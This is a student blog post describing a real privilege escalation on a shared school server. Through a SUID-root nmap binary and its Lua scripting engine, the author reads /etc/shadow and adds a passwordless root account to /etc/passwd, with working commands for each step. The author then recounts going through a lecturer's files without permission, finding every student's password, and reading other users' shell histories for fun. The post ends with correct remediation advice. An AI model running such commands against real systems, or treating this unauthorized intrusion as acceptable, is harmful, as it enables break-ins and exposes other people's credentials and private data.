---
layout: ../../layouts/Post.astro
title: "Privilege Escalation On School Server"
description: "Abusing a misconfigured SUID nmap binary via the Nmap Scripting to escalate from a low-privileged user to root."
date: "Spring 2026"
type: blog
tags: ["privilege escalation", "SUID", "nmap", "NSE", "Lua", "Linux"]
backLink: /blog
backLabel: Back to posts
---

## Background
So we had the first lab of our last course and it started by all students got an email with credentials for our own accounts, a pre configured 12 character password. Probably for the best since most student has the combined IQ of a pencil sharpener.

Some of the tasks in the lab was to set up SSH keys (done in 2 minutes), than some basic recon with nmap and open source tools. Me and the two I usually work with finished it in like 15 minutes so we started talking about what we could do with the server because we didn't have access to other students folders. We had just base privileges, access to our own stuff. I figured that since we had access to the machine we might aswell test and see what we could to do. Sudo was not installed so we couldn't see what we could do as root. So I just check what SUIDs we had and found that NMAP was installed as root and ran as root.


On Linux, the SUID (Set-User-ID) bit lets a binary run with the privileges of its owner rather than the invoking user. When the owner is `root` and the binary can execute arbitrary code directly or through a scripting interface the SUID bit becomes a privilege-escalation primitive.


So I identified `nmap` since it had SUID as root. Modern nmap (5.21+) removed its old `--interactive` shell, but its Lua-based **NSE (Nmap Scripting Engine)** is more than capable of running arbitrary code. If `nmap` is SUID root, NSE scripts inherit that privilege.


## Step 1: Confirm the SUID bit

First, check that `nmap` is actually SUID root:

```bash
ls -l $(which nmap)
stat $(which nmap)
```

Output:

```
-rwsr-xr-x 1 root root 2899504 Mar 28  2025 /usr/bin/nmap
Access: (4755/-rwsr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
```

The `s` in the owner-execute position plus `Uid: 0/root` confirms the binary will run with an effective UID of 0.

It's also worth checking that the filesystem isn't mounted `nosuid`, which would neutralise the bit:

```bash
mount | grep -E '/(usr|/) '
```

No `nosuid` flag — we're good.

## Step 2: Testing

The natural first attempt is to have NSE spawn a shell:

```bash
printf 'prerule=function() return true end\naction=function() os.execute("/bin/sh -p") end\n' > /tmp/w.nse
nmap --script=/tmp/w.nse
```

A few things to note about the script structure:

- `prerule = function() return true end` tells NSE to run the script once before any scan. Without a rule (prerule, hostrule, portrule, or postrule), NSE refuses to load the script with `missing required function: 'rule'`.
- `action` is what actually executes.
- `/bin/sh -p` is critical — the `-p` flag tells `sh` to preserve the effective UID. Without it, bash/dash drop privileges whenever euid != uid.

Running this gave us a shell but:

```
$ id
uid=1027(anol0124) gid=1027(anol0124) groups=1027(anol0124)
```

Still as my user.

## Step 3: Privilege drop

To figure out where privileges are being lost, write a diagnostic script that exercises Lua's file I/O directly (which uses raw syscalls, no shell in between):

```bash
printf 'prerule=function() return true end\naction=function() os.execute("id > /tmp/whoami.txt") end\n' > /tmp/w.nse
nmap --script=/tmp/w.nse
cat /tmp/whoami.txt
```

Result:

```
uid=1027(anol0124) gid=1027(anol0124) groups=1027(anol0124)
```

So even a file written via `os.execute` comes out owned by the unprivileged user. The issue is the **shell hop**:

`os.execute()` in Lua wraps libc's `system()`, which runs `/bin/sh -c "<command>"`. That outer `sh` has **no** `-p` flag. When it starts and sees euid != uid, it drops privileges before ever running the inner `/bin/sh -p`. By the time our shell spawns, it's already too late.

## Step 4: Confirming Lua has root

The fix is to do the privileged action in Lua directly, skipping the shell intermediary. First, verify that Lua itself actually has euid 0 by reading a root-only file:

```bash
printf 'prerule=function() return true end\naction=function() local f=io.open("/etc/shadow","r") if f then print("LUA IS ROOT") f:close() else print("lua dropped too") end end\n' > /tmp/w.nse
nmap --script=/tmp/w.nse
```

If Lua prints `LUA IS ROOT`, we've confirmed the Lua runtime itself have root and only the shell hop was dropping privileges.

## Step 5: Escalating without the shell hop

With Lua running as root, we can use its native `io` functions to perform privileged file operations. Rather than going through a shell, we append a new root user directly to `/etc/passwd`:

```bash
printf 'prerule=function() return true end\naction=function() local f=io.open("/etc/passwd","a") f:write("toor::0:0::/root:/bin/bash\\n") f:close() end\n' > /tmp/w.nse
nmap --script=/tmp/w.nse
```


- `toor` — the username
- `::` — empty password field (when empty and the system honours legacy `/etc/passwd` passwords rather than shadow, no password is required)
- `0:0` — UID and GID both set to 0, i.e. root
- `::/root:/bin/bash` — set root as the home directory, bash as the shell

This works because modern Linux systems still read `/etc/passwd` for account lookups, and an empty password field in `/etc/passwd` is treated as "no password required" by `su` on many configurations.

## Step 6: Using the new account

```bash
su toor
```

No password prompt. Then:

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

Root achieved via a misconfigured SUID binary and NSE.


## Fucking Around and finding out

So after that we started going through the server, more specifically we checked lecturers account and find a password file with all the students 12 character passwords (mentioned in the start). He had used it to create the users, kinda smart only that he kept the file on the server. After that we checked the `.bash_history` of both the lecturer and the other students just for fun. The school have not found it yet to our knowledge so we left a note in the `/root` that we can reference in the exam.

## Lessons

A few takeaways:

**Why this works.** NSE is a fully featured Lua environment with file and process APIs. Any scriptable SUID binary is effectively a root code execution.

**How to fix it as an administrator.** The correct way to give `nmap` the network capabilities it needs for raw sockets is file capabilities, not SUID:

```bash
sudo setcap cap_net_raw,cap_net_admin,cap_net_bind_service+eip /usr/bin/nmap
sudo chmod u-s /usr/bin/nmap
```

This grants the narrow network privileges nmap actually needs without giving it root for everything.

**General rule.** Any SUID-root binary with a scripting interface, a shell escape, or an exec-style function is a vulnerability. GTFOBins maintains a reference list of documented escalation paths when mis-configured with SUID.

## References

- GTFOBins: https://gtfobins.github.io/gtfobins/nmap/
